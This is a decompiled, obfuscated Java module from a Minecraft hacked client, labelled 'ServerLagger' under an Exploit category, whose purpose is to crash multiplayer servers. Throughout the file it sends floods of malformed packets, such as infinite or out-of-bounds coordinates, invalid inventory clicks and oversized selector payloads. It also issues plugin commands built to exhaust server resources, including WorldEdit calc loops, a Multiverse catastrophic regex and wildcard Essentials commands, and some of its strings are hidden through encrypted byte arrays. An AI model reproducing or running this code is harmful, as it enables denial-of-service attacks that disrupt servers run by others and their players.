/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap
 *  it.unimi.dsi.fastutil.ints.Int2ObjectMap
 *  it.unimi.dsi.fastutil.ints.Int2ObjectMaps
 *  it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap
 *  net.minecraft.class_1268
 *  net.minecraft.class_1297
 *  net.minecraft.class_1533
 *  net.minecraft.class_1657
 *  net.minecraft.class_1690
 *  net.minecraft.class_1703
 *  net.minecraft.class_1707
 *  net.minecraft.class_1713
 *  net.minecraft.class_1714
 *  net.minecraft.class_1735
 *  net.minecraft.class_1738
 *  net.minecraft.class_1799
 *  net.minecraft.class_1802
 *  net.minecraft.class_1935
 *  net.minecraft.class_2338
 *  net.minecraft.class_2350
 *  net.minecraft.class_2374
 *  net.minecraft.class_239
 *  net.minecraft.class_243
 *  net.minecraft.class_2596
 *  net.minecraft.class_2670
 *  net.minecraft.class_2805
 *  net.minecraft.class_2813
 *  net.minecraft.class_2824
 *  net.minecraft.class_2827
 *  net.minecraft.class_2828$class_2829
 *  net.minecraft.class_2828$class_2830
 *  net.minecraft.class_2833
 *  net.minecraft.class_2836
 *  net.minecraft.class_2840
 *  net.minecraft.class_2846
 *  net.minecraft.class_2846$class_2847
 *  net.minecraft.class_2868
 *  net.minecraft.class_2885
 *  net.minecraft.class_2886
 *  net.minecraft.class_3935
 *  net.minecraft.class_3965
 *  net.minecraft.class_516
 *  net.minecraft.class_634
 *  net.minecraft.class_8786
 */
package dev.Astra;

import com.kbox.runtime.KBoxRuntime;
import dev.Astra.Astra;
import dev.Astra.api.events.eventbus.EventListener;
import dev.Astra.api.events.impl.GameLeftEvent;
import dev.Astra.api.events.impl.PacketEvent;
import dev.Astra.api.events.impl.UpdateEvent;
import dev.Astra.a\u034f;
import dev.Astra.b\u0330;
import dev.Astra.b\u0332;
import dev.Astra.b\u0333;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMaps;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import java.util.Iterator;
import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import net.minecraft.class_1268;
import net.minecraft.class_1297;
import net.minecraft.class_1533;
import net.minecraft.class_1657;
import net.minecraft.class_1690;
import net.minecraft.class_1703;
import net.minecraft.class_1707;
import net.minecraft.class_1713;
import net.minecraft.class_1714;
import net.minecraft.class_1735;
import net.minecraft.class_1738;
import net.minecraft.class_1799;
import net.minecraft.class_1802;
import net.minecraft.class_1935;
import net.minecraft.class_2338;
import net.minecraft.class_2350;
import net.minecraft.class_2374;
import net.minecraft.class_239;
import net.minecraft.class_243;
import net.minecraft.class_2596;
import net.minecraft.class_2670;
import net.minecraft.class_2805;
import net.minecraft.class_2813;
import net.minecraft.class_2824;
import net.minecraft.class_2827;
import net.minecraft.class_2828;
import net.minecraft.class_2833;
import net.minecraft.class_2836;
import net.minecraft.class_2840;
import net.minecraft.class_2846;
import net.minecraft.class_2868;
import net.minecraft.class_2885;
import net.minecraft.class_2886;
import net.minecraft.class_3935;
import net.minecraft.class_3965;
import net.minecraft.class_516;
import net.minecraft.class_634;
import net.minecraft.class_8786;

public final class b\u0304
extends a\u034f {
    private final b\u0332<a\u0300> a\u0301 = this.add(new b\u0332<a\u0300>("Mode", a\u0300.Selector));
    private final b\u0333 a\u0302 = this.add(new b\u0333("ArmorPackets", 1000.0, 1.0, 10000.0, 1.0, () -> {
        a\u0300 a\u03002 = this.a\u0301.a\u0303();
        int n = -32;
        int n2 = 17;
        return a\u03002 == a\u0300.Armor;
    }));
    private final b\u0333 a\u0303 = this.add(new b\u0333("WindowPackets", 6.0, 2.0, 12.0, 1.0, () -> {
        if (this.a\u0301.a\u0303() == a\u0300.Window) {
            int n = -78;
            int n2 = -29;
            return true;
        }
        return false;
    }));
    private final b\u0333 a\u0304 = this.add(new b\u0333("OPackets", 1000.0, 1.0, 10000.0, 1.0, () -> {
        block5: {
            block4: {
                if (this.a\u0301.a\u0303() == a\u0300.Offhand || this.a\u0301.a\u0303() == a\u0300.Swap) break block4;
                a\u0300 a\u03002 = this.a\u0301.a\u0303();
                int n = 3;
                int n2 = -34;
                if (a\u03002 != a\u0300.SwitchSlot) break block5;
            }
            return true;
        }
        return false;
    }));
    private final b\u0333 a\u0305 = this.add(new b\u0333("VPackets", 2000.0, 100.0, 10000.0, 1.0, () -> {
        block5: {
            block4: {
                if (this.a\u0301.a\u0303() == a\u0300.Vehicle) break block4;
                a\u0300 a\u03002 = this.a\u0301.a\u0303();
                int n = -121;
                if (a\u03002 != a\u0300.Boat) break block5;
            }
            return true;
        }
        return false;
    }));
    private final b\u0333 a\u0306 = this.add(new b\u0333("AACPackets", 5000.0, 1.0, 10000.0, 1.0, () -> {
        block5: {
            block4: {
                if (this.a\u0301.a\u0303() == a\u0300.AAC || this.a\u0301.a\u0303() == a\u0300.AAC2) break block4;
                a\u0300 a\u03002 = this.a\u0301.a\u0303();
                int n = 73;
                if (a\u03002 != a\u0300.NullPosition) break block5;
            }
            return true;
        }
        return false;
    }));
    private final b\u0333 a\u0307 = this.add(new b\u0333("SlotPackets", 15.0, 1.0, 100.0, 1.0, () -> {
        if (this.a\u0301.a\u0303() == a\u0300.InvalidClickSlot) {
            int n = -43;
            int n2 = -9;
            return true;
        }
        return false;
    }));
    private final b\u0333 a\u0308;
    private final b\u0333 a\u0309;
    private final b\u0333 a\u030a;
    private final b\u0333 a\u030b;
    private final b\u0333 a\u030c;
    private final b\u0333 a\u030d;
    private final b\u0330 a\u030e;
    private final b\u0330 a\u030f;
    private final b\u0330 a\u0310;
    private final b\u0333 a\u0311;
    private int a\u0312;
    private long a\u0313;

    public b\u0304() {
        super("ServerLagger", a\u034f.a\u0300.Exploit);
        byte[] byArray = new byte[36];
        byArray[0] = 158;
        byArray[1] = 205;
        byArray[2] = 42;
        byArray[3] = 166;
        byArray[4] = 65;
        byArray[5] = 4;
        byArray[6] = 51;
        byArray[7] = 125;
        byArray[8] = 60;
        byArray[9] = 8;
        byArray[10] = 250;
        byArray[11] = 11;
        byArray[12] = 87;
        byArray[13] = 143;
        byArray[14] = 222;
        byArray[15] = 18;
        byArray[16] = 21;
        byArray[17] = 131;
        byArray[18] = 58;
        byArray[19] = 88;
        byArray[20] = 185;
        byArray[21] = 114;
        byArray[22] = 21;
        byArray[23] = 131;
        byArray[24] = 136;
        byArray[25] = 17;
        byArray[26] = 225;
        byArray[27] = 12;
        byArray[28] = 84;
        byArray[29] = 225;
        int n = 85;
        byArray[30] = 82;
        byArray[31] = 60;
        byArray[32] = 150;
        byArray[33] = 18;
        byArray[34] = 57;
        byArray[35] = 21;
        this.a\u0308 = this.add(new b\u0333(KBoxRuntime.a(byArray), 15.0, 1.0, 100.0, 1.0, () -> {
            block5: {
                block4: {
                    if (this.a\u0301.a\u0303() == a\u0300.InteractNoCom) break block4;
                    a\u0300 a\u03002 = this.a\u0301.a\u0303();
                    int n = 85;
                    int n2 = 66;
                    if (a\u03002 != a\u0300.InteractItem) break block5;
                }
                return true;
            }
            return false;
        }));
        int n2 = 123;
        this.a\u0309 = this.add(new b\u0333("MPackets", 2000.0, 1.0, 10000.0, 1.0, () -> {
            if (this.a\u0301.a\u0303() == a\u0300.MovementSpam) {
                int n = -35;
                int n2 = 28;
                return true;
            }
            return false;
        }));
        this.a\u030a = this.add(new b\u0333("CraftPackets", 3.0, 1.0, 100.0, 1.0, () -> {
            a\u0300 a\u03002 = this.a\u0301.a\u0303();
            int n = -78;
            int n2 = 94;
            return a\u03002 == a\u0300.Crafting;
        }));
        this.a\u030b = this.add(new b\u0333("SPackets", 200.0, 50.0, 2000.0, 1.0, () -> {
            a\u0300 a\u03002 = this.a\u0301.a\u0303();
            int n = 117;
            int n2 = -82;
            return a\u03002 == a\u0300.InteractBlock;
        }));
        this.a\u030c = this.add(new b\u0333("Count", 3.0, 1.0, 5.0, 1.0, () -> {
            if (this.a\u0301.a\u0303() == a\u0300.Selector) {
                int n = 110;
                int n2 = 121;
                return true;
            }
            return false;
        }));
        this.a\u030d = this.add(new b\u0333("Length", 2032.0, 1000.0, 3000.0, 1.0, () -> {
            a\u0300 a\u03002 = this.a\u0301.a\u0303();
            int n = 75;
            int n2 = -73;
            return a\u03002 == a\u0300.Selector;
        }));
        this.a\u030e = this.add(new b\u0330("Empty", true, () -> this.a\u0301.a\u0300(a\u0300.Song)));
        this.a\u030f = this.add(new b\u0330("AutoDisable", true));
        this.a\u0310 = this.add(new b\u0330("SmartDisable", true));
        this.a\u0311 = this.add(new b\u0333("Delay", 1.0, 0.0, 100.0, 1.0).a\u0300("tick"));
        this.a\u0312 = 0;
        this.setChinese("崩服");
    }

    private static double a\u0300(double d) {
        return new Random().nextDouble() * d;
    }

    @EventListener
    public final void onUpdate(UpdateEvent updateEvent) {
        if (b\u0304.nullCheck()) {
            if (this.a\u030f.a\u0302()) {
                this.disable();
            }
            return;
        }
        ++this.a\u0312;
        if ((double)this.a\u0312 <= this.a\u0311.a\u0303()) {
            return;
        }
        this.a\u0312 = 0;
        switch (this.a\u0301.a\u0303().ordinal()) {
            case 22: {
                class_1707 class_17072;
                boolean bl = false;
                class_1703 class_17032 = b\u0304.a\u0300.field_1724.field_7512;
                if (class_17032 instanceof class_1707) {
                    int n2;
                    class_17072 = (class_1707)class_17032;
                    for (n2 = 0; n2 < class_17072.method_7629().method_5439(); ++n2) {
                        class_1735 class_17352 = class_17072.method_7611(n2);
                        if (!class_17352.method_7681() || class_17352.method_7677().method_7909() != class_1802.field_8573) continue;
                        b\u0304.a\u0300.field_1761.method_2906(b\u0304.a\u0300.field_1724.field_7512.field_7763, class_17352.field_7874, 1, class_1713.field_7795, (class_1657)b\u0304.a\u0300.field_1724);
                        return;
                    }
                    for (n2 = 0; n2 < class_17072.method_7629().method_5439(); ++n2) {
                        if ((class_17072.method_7611(n2).method_7681() || this.a\u030e.a\u0302()) && n2 < 45) {
                            b\u0304.a\u0300.field_1761.method_2906(b\u0304.a\u0300.field_1724.field_7512.field_7763, n2, 1, class_1713.field_7795, (class_1657)b\u0304.a\u0300.field_1724);
                            bl = true;
                        }
                        if (n2 != 51) continue;
                        b\u0304.a\u0300.field_1761.method_2906(b\u0304.a\u0300.field_1724.field_7512.field_7763, n2, 0, class_1713.field_7790, (class_1657)b\u0304.a\u0300.field_1724);
                    }
                }
                if (bl) break;
                for (class_1297 class_12972 : Astra.THREAD.a\u0301) {
                    if (!(class_12972 instanceof class_1533)) continue;
                    class_17072 = (class_1533)class_12972;
                    if (!(b\u0304.a\u0300.field_1724.method_33571().method_1022(class_17072.method_19538()) < 3.0)) continue;
                    a\u0300.method_1562().method_52787((class_2596)class_2824.method_34208((class_1297)class_17072, (boolean)b\u0304.a\u0300.field_1724.method_5715(), (class_1268)class_1268.field_5808, (class_243)class_17072.method_19538()));
                    return;
                }
                return;
            }
            case 26: {
                class_1703 class_17033 = b\u0304.a\u0300.field_1724.field_7512;
                Int2ObjectArrayMap int2ObjectArrayMap = new Int2ObjectArrayMap();
                int2ObjectArrayMap.put(0, (Object)new class_1799((class_1935)class_1802.field_8094, 1));
                int n3 = 0;
                while ((double)n3 < this.a\u0303.a\u0303() + 1.0) {
                    a\u0300.method_1562().method_52787((class_2596)new class_2813(class_17033.field_7763, class_17033.method_37421(), 36, -1, class_1713.field_7791, class_17033.method_34255().method_7972(), (Int2ObjectMap)int2ObjectArrayMap));
                    ++n3;
                }
                break;
            }
            case 2: {
                for (int i = 0; i < this.a\u0302.a\u0305(); ++i) {
                    if (b\u0304.a\u0300.field_1724.method_31548().method_5438(38).method_7909() != class_1802.field_8162) {
                        b\u0304.a\u0300.field_1761.method_2906(b\u0304.a\u0300.field_1724.field_7512.field_7763, 6, 0, class_1713.field_7791, (class_1657)b\u0304.a\u0300.field_1724);
                    }
                    if (!(b\u0304.a\u0300.field_1724.method_6047().method_7909() instanceof class_1738) && b\u0304.a\u0300.field_1724.method_6047().method_7909() != class_1802.field_8833) continue;
                    b\u0304.a\u0300.field_1761.method_2919((class_1657)b\u0304.a\u0300.field_1724, class_1268.field_5808);
                }
                return;
            }
            case 4: {
                for (int i = 0; i < 5; ++i) {
                    class_2827 class_28272 = new class_2827(this.a\u0313++);
                    try {
                        a\u0300.method_1562().method_52787((class_2596)class_28272);
                        continue;
                    }
                    catch (Exception exception) {
                        exception.printStackTrace();
                    }
                }
                return;
            }
            case 18: {
                for (int i = 0; i < 100; ++i) {
                    class_1799 class_17992 = new class_1799((class_1935)b\u0304.a\u0300.field_1724.method_6047().method_7909());
                    class_2813 class_28132 = new class_2813(0, 69, b\u0304.a\u0300.field_1724.field_7512.method_37421(), 1, class_1713.field_7794, class_17992, (Int2ObjectMap)new Int2ObjectOpenHashMap());
                    try {
                        a\u0300.method_1562().method_52787((class_2596)class_28132);
                        continue;
                    }
                    catch (Exception exception) {
                        exception.printStackTrace();
                    }
                }
                return;
            }
            case 6: {
                if (!(b\u0304.a\u0300.field_1724.field_7512 instanceof class_1714) || a\u0300.method_1562() == null) {
                    return;
                }
                try {
                    Iterator iterator = b\u0304.a\u0300.field_1724.method_3130().method_1393().iterator();
                    while (iterator.hasNext()) {
                        for (class_8786 class_87862 : ((class_516)iterator.next()).method_2648(true)) {
                            int n4 = 0;
                            while ((double)n4 < this.a\u030a.a\u0303()) {
                                a\u0300.method_1562().method_52787((class_2596)new class_2840(b\u0304.a\u0300.field_1724.field_7512.field_7763, class_87862, true));
                                ++n4;
                            }
                        }
                    }
                    return;
                }
                catch (Exception exception) {
                    String string = exception.getMessage();
                    this.sendMessage("§4" + string);
                    exception.printStackTrace();
                    if (!this.a\u0310.a\u0302()) break;
                    this.disable();
                    return;
                }
            }
            case 9: {
                class_239 class_2392 = a\u0300.method_1560().method_5745(256.0, 0.0f, false);
                if (!(class_2392 instanceof class_3965)) break;
                class_243 class_2432 = ((class_3965)class_2392).method_17784();
                class_3965 class_39652 = new class_3965(class_2432, class_2350.field_11033, class_2338.method_49638((class_2374)class_2432), false);
                int n5 = 0;
                while ((double)n5 < this.a\u030b.a\u0303()) {
                    a\u0300.method_1562().method_52787((class_2596)new class_2885(class_1268.field_5808, class_39652, -1));
                    ++n5;
                }
                break;
            }
            case 15: {
                if (a\u0300.method_1562() == null) {
                    return;
                }
                try {
                    class_243 class_2433 = b\u0304.a\u0300.field_1724.method_19538();
                    int n6 = 0;
                    while ((double)n6 < this.a\u0309.a\u0303()) {
                        class_2828.class_2830 class_28302 = new class_2828.class_2830(class_2433.field_1352 + b\u0304.a\u0300(), class_2433.field_1351 + b\u0304.a\u0300(), class_2433.field_1350 + b\u0304.a\u0300(), (float)b\u0304.a\u0300(90.0), (float)b\u0304.a\u0300(180.0), true);
                        a\u0300.method_1562().method_52787((class_2596)class_28302);
                        ++n6;
                    }
                    return;
                }
                catch (Exception exception) {
                    String string = exception.getMessage();
                    this.sendMessage("§4" + string);
                    exception.printStackTrace();
                    if (!this.a\u0310.a\u0302()) break;
                    this.disable();
                    return;
                }
            }
            case 21: {
                int n7 = this.a\u030d.a\u0305();
                String string = IntStream.range(0, n7).mapToObj(n -> {
                    byte[] byArray = new byte[36];
                    byArray[0] = 103;
                    byArray[1] = 123;
                    byArray[2] = 56;
                    byArray[3] = 135;
                    byArray[4] = 206;
                    byArray[5] = 245;
                    byArray[6] = 48;
                    byArray[7] = 72;
                    byArray[8] = 113;
                    byArray[9] = 24;
                    byArray[10] = 235;
                    byArray[11] = 179;
                    byArray[12] = 142;
                    byArray[13] = 35;
                    byArray[14] = 253;
                    byArray[15] = 195;
                    byArray[16] = 23;
                    byArray[17] = 153;
                    byArray[18] = 2;
                    byArray[19] = 2;
                    byArray[20] = 219;
                    byArray[21] = 186;
                    byArray[22] = 232;
                    int n2 = 85;
                    byArray[23] = 216;
                    byArray[24] = 126;
                    byArray[25] = 175;
                    byArray[26] = 110;
                    byArray[27] = 12;
                    byArray[28] = 242;
                    byArray[29] = 210;
                    byArray[30] = 200;
                    byArray[31] = 220;
                    byArray[32] = 49;
                    byArray[33] = 152;
                    byArray[34] = 90;
                    byArray[35] = 56;
                    return KBoxRuntime.a(byArray);
                }).collect(Collectors.joining());
                String string2 = "{keyCodec:" + string + "}";
                String string3 = "msg @keyCodec[nbt={PAYLOAD}]".replace("{PAYLOAD}", string2);
                int n8 = 0;
                while ((double)n8 < this.a\u030c.a\u0303()) {
                    a\u0300.method_1562().method_52787((class_2596)new class_2805(0, string3));
                    ++n8;
                }
                if (!this.a\u0310.a\u0302()) break;
                this.disable();
                return;
            }
            case 14: {
                if (!(b\u0304.a\u0300.field_1755 instanceof class_3935)) {
                    return;
                }
                a\u0300.method_1562().method_52787((class_2596)new class_2813(b\u0304.a\u0300.field_1724.field_7512.field_7763, b\u0304.a\u0300.field_1724.field_7512.method_37421(), 0, 0, class_1713.field_7794, b\u0304.a\u0300.field_1724.field_7512.method_34255().method_7972(), Int2ObjectMaps.emptyMap()));
                if (!this.a\u0310.a\u0302()) break;
                this.disable();
                return;
            }
            case 11: {
                int n9 = 0;
                while ((double)n9 < this.a\u0308.a\u0303()) {
                    class_243 class_2434 = new class_243((double)new Random().nextInt(0xFFFFFF), 255.0, (double)new Random().nextInt(0xFFFFFF));
                    a\u0300.method_1562().method_52787((class_2596)new class_2885(class_1268.field_5808, new class_3965(class_2434, class_2350.field_11033, class_2338.method_49638((class_2374)class_2434), false), 0));
                    ++n9;
                }
                break;
            }
            case 12: {
                class_243 class_2435 = new class_243(Double.POSITIVE_INFINITY, 255.0, Double.NEGATIVE_INFINITY);
                int n10 = 102;
                a\u0300.method_1562().method_52787((class_2596)new class_2885(class_1268.field_5808, new class_3965(class_2435, class_2350.field_11033, class_2338.method_49638((class_2374)class_2435), false), 0));
                return;
            }
            case 10: {
                int n11 = 0;
                while ((double)n11 < this.a\u0308.a\u0303()) {
                    b\u0304.sendSequencedPacket(n -> {
                        int n2 = 29;
                        int n3 = -13;
                        return new class_2886(class_1268.field_5808, n, Astra.ROTATION.a\u0304, Astra.ROTATION.a\u0305);
                    });
                    ++n11;
                }
                break;
            }
            case 13: {
                Int2ObjectArrayMap int2ObjectArrayMap = new Int2ObjectArrayMap();
                int2ObjectArrayMap.put(0, (Object)new class_1799((class_1935)class_1802.field_8264, 1));
                int n12 = 0;
                while ((double)n12 < this.a\u0307.a\u0303()) {
                    a\u0300.method_1562().method_52787((class_2596)new class_2813(b\u0304.a\u0300.field_1724.field_7512.field_7763, 123344, 2957234, 2859623, class_1713.field_7790, new class_1799((class_1935)class_1802.field_8162, -1), (Int2ObjectMap)int2ObjectArrayMap));
                    ++n12;
                }
                break;
            }
            case 0: {
                for (double d = 0.0; d < this.a\u0306.a\u0303(); d += 1.0) {
                    class_634 class_6342 = a\u0300.method_1562();
                    double d2 = b\u0304.a\u0300.field_1724.method_23317() + d * 9412.0;
                    int n13 = -106;
                    class_6342.method_52787((class_2596)new class_2828.class_2829(d2, b\u0304.a\u0300.field_1724.method_23318() + d * 9412.0, b\u0304.a\u0300.field_1724.method_23321() + d * 9412.0, true));
                }
                if (!this.a\u0310.a\u0302()) break;
                this.disable();
                return;
            }
            case 1: {
                for (double d = 0.0; d < this.a\u0306.a\u0303(); d += 1.0) {
                    a\u0300.method_1562().method_52787((class_2596)new class_2828.class_2829(b\u0304.a\u0300.field_1724.method_23317() + d * 500000.0, b\u0304.a\u0300.field_1724.method_23318() + d * 500000.0, b\u0304.a\u0300.field_1724.method_23321() + d * 500000.0, true));
                }
                if (!this.a\u0310.a\u0302()) break;
                this.disable();
                return;
            }
            case 17: {
                for (double d = 0.0; d < this.a\u0306.a\u0303(); d += 1.0) {
                    a\u0300.method_1562().method_52787((class_2596)new class_2828.class_2829(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                }
                if (!this.a\u0310.a\u0302()) break;
                this.disable();
                return;
            }
            case 3: {
                class_1297 class_12973 = b\u0304.a\u0300.field_1724.method_5854();
                if (class_12973 == null) {
                    if (this.a\u0310.a\u0302()) {
                        this.disable();
                    }
                    return;
                }
                if (!(class_12973 instanceof class_1690) && this.a\u0310.a\u0302()) {
                    this.disable();
                }
                int n14 = 0;
                while ((double)n14 < this.a\u0305.a\u0303()) {
                    a\u0300.method_1562().method_52787((class_2596)new class_2836(true, true));
                    ++n14;
                }
                break;
            }
            case 25: {
                class_1297 class_12974 = b\u0304.a\u0300.field_1724.method_5854();
                if (class_12974 == null) {
                    if (this.a\u0310.a\u0302()) {
                        this.disable();
                    }
                    return;
                }
                class_2338 class_23382 = b\u0304.a\u0300.field_1724.method_24515();
                class_243 class_2436 = new class_243((double)class_23382.method_10263() + 0.5, (double)(class_23382.method_10264() + 1), (double)class_23382.method_10260() + 0.5);
                class_12974.method_30634(class_2436.field_1352, class_2436.field_1351 - 1.0, class_2436.field_1350);
                int n15 = 0;
                while ((double)n15 < this.a\u0305.a\u0303()) {
                    a\u0300.method_1562().method_52787((class_2596)new class_2833(class_12974));
                    ++n15;
                }
                break;
            }
            case 24: {
                int n16 = 0;
                while ((double)n16 < this.a\u0304.a\u0303()) {
                    b\u0304.a\u0300.field_1724.field_3944.method_52787((class_2596)new class_2868(0));
                    b\u0304.a\u0300.field_1724.field_3944.method_52787((class_2596)new class_2868(1));
                    ++n16;
                }
                break;
            }
            case 23: {
                int n17 = 0;
                while ((double)n17 < this.a\u0304.a\u0303()) {
                    b\u0304.a\u0300.field_1761.method_2906(b\u0304.a\u0300.field_1724.field_7512.field_7763, 45, b\u0304.a\u0300.field_1724.method_31548().field_7545, class_1713.field_7791, (class_1657)b\u0304.a\u0300.field_1724);
                    ++n17;
                }
                break;
            }
            case 19: {
                int n18 = 0;
                while ((double)n18 < this.a\u0304.a\u0303()) {
                    a\u0300.method_1562().method_52787((class_2596)new class_2846(class_2846.class_2847.field_12969, class_2338.field_10980, class_2350.field_11036));
                    ++n18;
                }
                break;
            }
            case 8: {
                a\u0300.method_1562().method_45730("to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                if (!this.a\u0310.a\u0302()) break;
                this.disable();
                return;
            }
            case 27: {
                a\u0300.method_1562().method_45730("/calc for(i=0;i<256;i++){for(keyCodec=0;keyCodec<256;keyCodec++){for(elementCodec=0;elementCodec<256;elementCodec++){for(c=0;c<255;c++){}}}}");
                if (!this.a\u0310.a\u0302()) break;
                this.disable();
                return;
            }
            case 5: {
                double d;
                for (d = b\u0304.a\u0300.field_1724.method_23318(); d < 255.0; d += 5.0) {
                    a\u0300.method_1562().method_52787((class_2596)new class_2828.class_2829(b\u0304.a\u0300.field_1724.method_23317(), d, b\u0304.a\u0300.field_1724.method_23321(), true));
                }
                for (d = 0.0; d < 6685.0; d += 5.0) {
                    a\u0300.method_1562().method_52787((class_2596)new class_2828.class_2829(b\u0304.a\u0300.field_1724.method_23317() + d, 255.0, b\u0304.a\u0300.field_1724.method_23321() + d, true));
                }
                return;
            }
            case 16: {
                a\u0300.method_1562().method_45730("mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
                if (!this.a\u0310.a\u0302()) break;
                this.disable();
                return;
            }
            case 7: {
                a\u0300.method_1562().method_45730("pay * keyCodec keyCodec");
                if (!this.a\u0310.a\u0302()) break;
                this.disable();
                return;
            }
            case 20: {
                a\u0300.method_1562().method_45730("promote * keyCodec");
                if (!this.a\u0310.a\u0302()) break;
                this.disable();
            }
        }
    }

    @EventListener
    public final void onPacketInbound(PacketEvent.Receive receive) {
        if (b\u0304.a\u0300.field_1724 == null || b\u0304.a\u0300.field_1687 == null) {
            return;
        }
        class_2596<?> class_25962 = receive.a\u0304();
        if (class_25962 instanceof class_2670) {
            class_2670 class_26702 = (class_2670)class_25962;
            this.a\u0313 = class_26702.method_11517();
        }
    }

    private static double a\u0300() {
        double d = b\u0304.a\u0300(1.0);
        int n = 40;
        int n2 = 11;
        return d - 0.5;
    }

    @Override
    public final String getInfo() {
        return this.a\u0301.a\u0303().name();
    }

    @Override
    public final void onDisable() {
        int n = 72;
        this.a\u0312 = 999;
    }

    @Override
    public final void onLogin() {
        if (this.a\u030f.a\u0302()) {
            this.disable();
        }
    }

    @EventListener
    public final void onLogout(GameLeftEvent gameLeftEvent) {
        if (this.a\u030f.a\u0302()) {
            this.disable();
        }
    }

    public static final class a\u0300
    extends Enum<a\u0300> {
        public static final /* enum */ a\u0300 AAC = new a\u0300();
        public static final /* enum */ a\u0300 AAC2 = new a\u0300();
        public static final /* enum */ a\u0300 Armor = new a\u0300();
        public static final /* enum */ a\u0300 Boat = new a\u0300();
        public static final /* enum */ a\u0300 Console = new a\u0300();
        public static final /* enum */ a\u0300 Chunk = new a\u0300();
        public static final /* enum */ a\u0300 Crafting = new a\u0300();
        public static final /* enum */ a\u0300 Essentials = new a\u0300();
        public static final /* enum */ a\u0300 FaweWorldEdit = new a\u0300();
        public static final /* enum */ a\u0300 InteractBlock = new a\u0300();
        public static final /* enum */ a\u0300 InteractItem = new a\u0300();
        public static final /* enum */ a\u0300 InteractNoCom = new a\u0300();
        public static final /* enum */ a\u0300 InteractOOB = new a\u0300();
        public static final /* enum */ a\u0300 InvalidClickSlot = new a\u0300();
        public static final /* enum */ a\u0300 Lectern;
        public static final /* enum */ a\u0300 MovementSpam;
        public static final /* enum */ a\u0300 MultiverseCore;
        public static final /* enum */ a\u0300 NullPosition;
        public static final /* enum */ a\u0300 OutOfBounds;
        public static final /* enum */ a\u0300 Offhand;
        public static final /* enum */ a\u0300 Promote;
        public static final /* enum */ a\u0300 Selector;
        public static final /* enum */ a\u0300 Song;
        public static final /* enum */ a\u0300 Swap;
        public static final /* enum */ a\u0300 SwitchSlot;
        public static final /* enum */ a\u0300 Vehicle;
        public static final /* enum */ a\u0300 Window;
        public static final /* enum */ a\u0300 WorldEdit;
        private static final /* synthetic */ a\u0300[] $VALUES;

        public static a\u0300[] values() {
            int n = -60;
            return (a\u0300[])$VALUES.clone();
        }

        public static a\u0300 valueOf(String string) {
            block0: {
                int n = 15;
                int n2 = -45;
                break block0;
            }
            return Enum.valueOf(a\u0300.class, string);
        }

        static {
            byte[] byArray = new byte[36];
            byArray[0] = 203;
            byArray[1] = 235;
            byArray[2] = 25;
            byArray[3] = 76;
            byArray[4] = 222;
            byArray[5] = 206;
            byArray[6] = 67;
            byArray[7] = 16;
            int n = -84;
            byArray[8] = 146;
            byArray[9] = 43;
            byArray[10] = 79;
            byArray[11] = 70;
            byArray[12] = 13;
            byArray[13] = 154;
            byArray[14] = 11;
            byArray[15] = 209;
            byArray[16] = 148;
            byArray[17] = 66;
            byArray[18] = 61;
            byArray[19] = 94;
            byArray[20] = 177;
            byArray[21] = 190;
            byArray[22] = 118;
            byArray[23] = 1;
            byArray[24] = 151;
            byArray[25] = 47;
            byArray[26] = 181;
            byArray[27] = 17;
            byArray[28] = 222;
            byArray[29] = 225;
            byArray[30] = 132;
            byArray[31] = 115;
            byArray[32] = 191;
            byArray[33] = 212;
            byArray[34] = 68;
            byArray[35] = 142;
            Lectern = new a\u0300();
            MovementSpam = new a\u0300();
            MultiverseCore = new a\u0300();
            NullPosition = new a\u0300();
            OutOfBounds = new a\u0300();
            Offhand = new a\u0300();
            Promote = new a\u0300();
            Selector = new a\u0300();
            Song = new a\u0300();
            Swap = new a\u0300();
            SwitchSlot = new a\u0300();
            Vehicle = new a\u0300();
            Window = new a\u0300();
            int n2 = -116;
            WorldEdit = new a\u0300();
            $VALUES = new a\u0300[]{AAC, AAC2, Armor, Boat, Console, Chunk, Crafting, Essentials, FaweWorldEdit, InteractBlock, InteractItem, InteractNoCom, InteractOOB, InvalidClickSlot, Lectern, MovementSpam, MultiverseCore, NullPosition, OutOfBounds, Offhand, Promote, Selector, Song, Swap, SwitchSlot, Vehicle, Window, WorldEdit};
        }
    }
}

